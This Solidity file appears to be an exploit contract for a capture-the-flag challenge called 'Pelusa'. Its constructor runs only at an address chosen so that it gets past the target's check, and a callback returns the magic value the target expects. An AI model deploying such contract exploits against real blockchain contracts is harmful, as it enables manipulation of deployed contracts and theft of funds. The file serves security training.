// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "./Pelusa.sol";

contract Shooter
{
    address private immutable owner;
    address internal player;
    uint256 public goals;

    //The real owner is the one who deployed the contract, could be retrieved via etherscan or a web3 script scraping for the contract creation transaction
    constructor(address target, address _owner) 
    {
        owner = _owner;
        if (uint160(address(this)) % 100 == 10)
        {
            Pelusa(target).passTheBall();
        }
    }

    function getBallPossesion() external view returns (address)
    {
        return owner;
    }

    function handOfGod() external returns (uint256)
    {
        goals = 2;
        return 22_06_1986;
    }
}